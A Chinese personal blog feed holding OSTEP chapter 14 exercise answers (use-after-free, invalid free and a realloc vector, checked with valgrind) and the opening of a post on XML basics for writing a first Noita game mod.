<h2 id="14-6"><a href="#14-6" class="headerlink" title="14.6"></a>14.6</h2><blockquote>
<p>创建一个分配整数数组的程序(如上所述)，释放它们，然后尝试打印数组中某个元素的值。程序会运行吗?当你使用 valgrind 时会发生什么?</p>
</blockquote>
<p>这个CS：APP里提过，我以前也试过。释放操作是lazy的，也就是简单地标记对应地址可用，而不着急删除里面的数据直到再次被利用。所以尝试打印是会有结果的，而且很有可能是正确的</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行一下：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auceptin_fang@Auceptin:~/OSTEP/chapter14$ ./14.6
<span class="token number">35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>没错，是正确的。如果是上课，老师多半要补充一句不建议，但是这么好玩的东西，生产环境不敢用，平时练习不得多用用</p>
<p>看看valgrind怎么说：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span> Invalid <span class="token builtin class-name">read</span> of size <span class="token number">4</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>    at 0x1091E5: main <span class="token punctuation">(</span>in /home/auceptin_fang/OSTEP/chapter14/14.6<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>  Address 0x4a770cc is <span class="token number">140</span> bytes inside a block of size <span class="token number">400</span> <span class="token function">free</span><span class="token string">'d
==121990==    at 0x484988F: free (in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so)
==121990==    by 0x1091DA: main (in /home/auceptin_fang/OSTEP/chapter14/14.6)
==121990==  Block was alloc'</span>d at
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>    at 0x4846828: malloc <span class="token punctuation">(</span>in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>    by 0x10919E: main <span class="token punctuation">(</span>in /home/auceptin_fang/OSTEP/chapter14/14.6<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>
<span class="token number">35</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span> 
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span> HEAP SUMMARY:
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>     <span class="token keyword">in</span> use at exit: <span class="token number">0</span> bytes <span class="token keyword">in</span> <span class="token number">0</span> blocks
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>   total heap usage: <span class="token number">2</span> allocs, <span class="token number">2</span> frees, <span class="token number">1,424</span> bytes allocated
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span> All heap blocks were freed -- no leaks are possible
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span> For lists of detected and suppressed errors, rerun with: <span class="token parameter variable">-s</span>
<span class="token operator">==</span><span class="token number">121990</span><span class="token operator">==</span> ERROR SUMMARY: <span class="token number">1</span> errors from <span class="token number">1</span> contexts <span class="token punctuation">(</span>suppressed: <span class="token number">0</span> from <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>还是非法访问呗</p>
<h2 id="14-7"><a href="#14-7" class="headerlink" title="14.7"></a>14.7</h2><blockquote>
<p>现在传递一个有趣的值来释放(例如，在上面分配的数组中间的一个指针)。会发生什么?你是否需要工具来找到这种类型的问题?</p>
</blockquote>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虽然free预期一个指针，但正如书中提到，要求是malloc返回的指针，如果不是的话——</p>
<p>编译时有了warning<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">14.7</span>.cpp: In <span class="token keyword">function</span> ‘int main<span class="token punctuation">(</span><span class="token punctuation">)</span>’:
<span class="token number">14.7</span>.cpp:9:9: warning: ‘void free<span class="token punctuation">(</span>void*<span class="token punctuation">)</span>’ called on pointer ‘data’ with nonzero offset <span class="token number">140</span> <span class="token punctuation">[</span>-Wfree-nonheap-object<span class="token punctuation">]</span>
    <span class="token number">9</span> <span class="token operator">|</span>     free<span class="token punctuation">(</span>data + <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ~~~~^~~~~~~~~~~
<span class="token number">14.7</span>.cpp:5:29: note: returned from ‘void* malloc<span class="token punctuation">(</span>size_t<span class="token punctuation">)</span>’
    <span class="token number">5</span> <span class="token operator">|</span>     int *data <span class="token operator">=</span> <span class="token punctuation">(</span>int*<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">100</span> * sizeof<span class="token punctuation">(</span>int<span class="token punctuation">))</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>                       ~~~~~~^~~~~~~~~~~~~~~~~~~<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>运行有了报错<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">free<span class="token punctuation">(</span><span class="token punctuation">)</span>: invalid pointer
Aborted <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>试一下valgrind：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span> Invalid free<span class="token punctuation">(</span><span class="token punctuation">)</span> / delete / delete<span class="token punctuation">[</span><span class="token punctuation">]</span> / realloc<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span>    at 0x484988F: <span class="token function">free</span> <span class="token punctuation">(</span>in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span>    by 0x1091C0: main <span class="token punctuation">(</span>in /home/auceptin_fang/OSTEP/chapter14/14.7<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span>  Address 0x4a770cc is <span class="token number">140</span> bytes inside a block of size <span class="token number">400</span> alloc'd
<span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span>    at 0x4846828: malloc <span class="token punctuation">(</span>in /usr/libexec/valgrind/vgpreload_memcheck-amd64-linux.so<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span>    by 0x10917E: main <span class="token punctuation">(</span>in /home/auceptin_fang/OSTEP/chapter14/14.7<span class="token punctuation">)</span>
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span> For lists of detected and suppressed errors, rerun with: <span class="token parameter variable">-s</span>
<span class="token operator">==</span><span class="token number">131046</span><span class="token operator">==</span> ERROR SUMMARY: <span class="token number">1</span> errors from <span class="token number">1</span> contexts <span class="token punctuation">(</span>suppressed: <span class="token number">0</span> from <span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="14-8"><a href="#14-8" class="headerlink" title="14.8"></a>14.8</h2><blockquote>
<p>尝试一些其他接口来分配内存。例如，创建一个简单的向量似的数据结构，以及使用realloc()来管理向量的相关函数。使用数组来存储向量元素。当用户在向量中添加条目时，请使用realloc()为其分配更多空间。这样的向量表现如何?它与链表相比如何?使用valgrind来帮助你发现错误</p>
</blockquote>
<p>这里的向量是在说vector吗，那还不如不翻译呢。提前到来的数据结构实践，参考去年学链表的经验了。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>
  <span class="token class-name">size_t</span> used_size<span class="token punctuation">;</span>
  <span class="token keyword">int</span><span class="token operator">*</span> data<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>vector<span class="token punctuation">;</span>

vector<span class="token operator">*</span> <span class="token function">vector_init</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//只支持输入大小初始化，且初始化为0</span>
  vector<span class="token operator">*</span> v <span class="token operator">=</span> <span class="token punctuation">(</span>vector<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vector<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v<span class="token operator">-></span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>
  v<span class="token operator">-></span>used_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

vector<span class="token operator">*</span> <span class="token function">vector_resize</span><span class="token punctuation">(</span>vector<span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token class-name">size_t</span> new_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  v<span class="token operator">-></span>data <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>v<span class="token operator">-></span>data<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v<span class="token operator">-></span>size <span class="token operator">=</span> new_size<span class="token punctuation">;</span>
  <span class="token keyword">return</span> v<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">vector_push_back</span><span class="token punctuation">(</span>vector<span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>v<span class="token operator">-></span>used_size <span class="token operator">==</span> v<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    v <span class="token operator">=</span> <span class="token function">vector_resize</span><span class="token punctuation">(</span>v <span class="token punctuation">,</span> v<span class="token operator">-></span>size <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v<span class="token operator">-></span>data<span class="token punctuation">[</span>v<span class="token operator">-></span>used_size<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
  v<span class="token operator">-></span>used_size <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">vector_pop_back</span><span class="token punctuation">(</span>vector<span class="token operator">*</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>v<span class="token operator">-></span>used_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v<span class="token operator">-></span>used_size <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v<span class="token operator">-></span>data<span class="token punctuation">[</span>v<span class="token operator">-></span>used_size<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  vector<span class="token operator">*</span> v <span class="token operator">=</span> <span class="token function">vector_init</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 向 vector 中添加一些元素</span>
  <span class="token function">vector_push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vector_push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vector_push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vector_push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vector_push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vector_push_back</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 由于容量为 5，推入第 6 个时会自动扩容</span>

  <span class="token comment">// 打印 vector 中的元素</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Vector contents after push_back operations:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v<span class="token operator">-></span>used_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> v<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 弹出最后一个元素</span>
  <span class="token keyword">int</span> popped_value <span class="token operator">=</span> <span class="token function">vector_pop_back</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Popped value: %d\n"</span><span class="token punctuation">,</span> popped_value<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 打印 vector 中的元素</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Vector contents after pop_back:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v<span class="token operator">-></span>used_size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> v<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// 释放内存</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实现完成，接下来是和链表对比。</p>
<p>在末尾增删元素：都是O(1)，其余的……没做</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;14-1&quot;&gt;&lt;a href=&quot;#14-1&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="OSTEP" scheme="https://aucept.in/categories/OSTEP/"/>
    
    
    <category term="OSTEP" scheme="https://aucept.in/tags/OSTEP/"/>
    
    <category term="操作系统" scheme="https://aucept.in/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>noita_mode_0</title>
    <link href="https://aucept.in/2025/06/28/noita-mode-0/"/>
    <id>https://aucept.in/2025/06/28/noita-mode-0/</id>
    <published>2025-06-28T06:57:03.000Z</published>
    <updated>2025-11-26T01:58:14.106Z</updated>
    
    <content type="html"><![CDATA[<p>本文用于记录本人的第一个noita的mod开发过程</p>
<h2 id="新建文件夹"><a href="#新建文件夹" class="headerlink" title="新建文件夹"></a>新建文件夹</h2><p>第一步，在mods文件夹下新建文件夹</p>
<p>一个模组至少包括两个文件，mod.xml和init.lua</p>
<h2 id="关于-xml文件"><a href="#关于-xml文件" class="headerlink" title="关于.xml文件"></a>关于.xml文件</h2><p>在pom.xml里已经<del>被折磨过</del>见过了，重新从头认识一下：eXtensible Markup Language，意为”可扩展标记语言”。</p>
<h3 id="声明（可以没有，noita的文件都没有）："><a href="#声明（可以没有，noita的文件都没有）：" class="headerlink" title="声明（可以没有，noita的文件都没有）："></a>声明（可以没有，noita的文件都没有）：</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>交代编码方式</p>
<h3 id="元素和属性"><a href="#元素和属性" class="headerlink" title="元素和属性"></a>元素和属性</h3><p>元素用成对的标签包裹内容，属性附着在起始标签上提供附加信息，必须加引号</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Mod</span>
<span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Daily Practice Run<span class="token punctuation">"</span></span>
<span class="token attr-name">description</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>You can practice by replaying the same seed within 24 hours.<span class="token punctuation">"</span></span>
<span class="token attr-name">ui_newgame_name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$gamemode_daily_practice_run<span class="token punctuation">"</span></span>
<span class="token attr-name">ui_newgame_description</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$gamemode_daily_practice_run_desc<span class="token punctuation">"</span></span>
<span class="token attr-name">ui_newgame_gfx_banner_bg</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mods/daily_practice/files/menu_banner_background.png<span class="token punctuation">"</span></span>
<span class="token attr-name">ui_newgame_gfx_banner_fg</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mods/daily_practice/files/menu_banner_overlay.png<span class="token punctuation">"</span></span>
<span class="token attr-name">request_no_api_restrictions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> 
<span class="token attr-name">is_game_mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span> 
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Mod</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>自闭合<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>wand<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>同html<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 这是一个魔法物品列表 --></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p>一种用特殊字符来表示另一些字符的机制。比如”&lt;”会被解析成一个标签开头，可以用一套以&amp;开头;结尾的字符替代</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字符</th>
<th>实体引用</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>&lt;</td>
<td>&lt;</td>
<td>less than（小于）</td>
</tr>
<tr>
<td>&gt;</td>
<td>&gt;</td>
<td>greater than（大于）</td>
</tr>
<tr>
<td>&amp;</td>
<td>&amp;</td>
<td>ampersand（&amp;符号）</td>
</tr>
<tr>
<td>“</td>
<td>&quot;</td>
<td>quotation mark（双引号）</td>
</tr>
<tr>
<td>‘</td>
<td>&apos;</td>
<td>apostrophe（单引号）</td>
</tr>
</tbody>
</table>
</div>
<h3 id="CDATA-区块"><a href="#CDATA-区块" class="headerlink" title="CDATA 区块"></a>CDATA 区块</h3><p>当你不想让某些字符被解析成标签，可以放入 CDATA：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token included-cdata"><span class="token cdata">&lt;![CDATA[</span><span class="token language-javascript">
  <span class="token keyword">if</span> <span class="token punctuation">(</span>hp <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> then <span class="token function">explode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="token cdata">]]&gt;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<h2 id="添加到游戏里的mod列表"><a href="#添加到游戏里的mod列表" class="headerlink" title="添加到游戏里的mod列表"></a>添加到游戏里的mod列表</h2><p>我们已经在对应目录下创建了文件夹，接下来只要正确初始化mod.xml和init.lua就可以了</p>
<p>对于最简的可实现在mod列表里看见的模组，xml文件里Mod元素写好name和description属性，init.lua空着即可</p>
<h2 id="ESC系统——游戏如何运行"><a href="#ESC系统——游戏如何运行" class="headerlink" title="ESC系统——游戏如何运行"></a>ESC系统——游戏如何运行</h2><p>要了解Noita的游戏逻辑，就需要了解“实体组件系统”（ECS，Entity Component System）<br>noita以 Lua 和 XML 语言实现ESC，游戏中每个独立的 “东西”（敌人、子弹、魔杖、物品、包括玩家）都是实体（Entity），只不过构成它们的组件不同。</p>
<p>比如sheep_fly.xml文件：<br><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Entity</span> <span class="token attr-name">tags</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mortal,prey,sheep<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$animal_sheep_fly<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Base</span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data/entities/base_helpless_animal.xml<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AnimalAIComponent</span> 
        <span class="token attr-name">preferred_job</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Escaping<span class="token punctuation">"</span></span>
<span class="token attr-name">attack_melee_enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span>
<span class="token attr-name">attack_ranged_entity_file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span>
